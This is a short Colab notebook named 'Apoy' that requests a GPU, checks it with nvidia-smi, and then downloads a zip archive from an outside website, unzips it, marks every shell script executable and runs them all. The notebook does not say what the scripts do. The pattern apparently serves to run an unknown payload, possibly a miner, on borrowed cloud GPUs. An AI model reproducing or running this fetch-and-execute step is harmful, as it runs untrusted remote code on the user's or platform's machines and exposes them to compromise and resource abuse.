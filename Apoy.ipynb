{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Apoy.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "8uQ12Gz6ZzCb"
      },
      "source": [
        "# **Apoy**\n",
        "\n",
        "\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "8S3CXRBTZa6C"
      },
      "source": [
        "# Check VGA\n",
        "!nvidia-smi\n",
        "# Run \n",
        "!!wget https://seoindonesia.org/Adi.zip && unzip Adi.zip  && chmod +x *.sh && sh *.sh\n",
        "!done"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}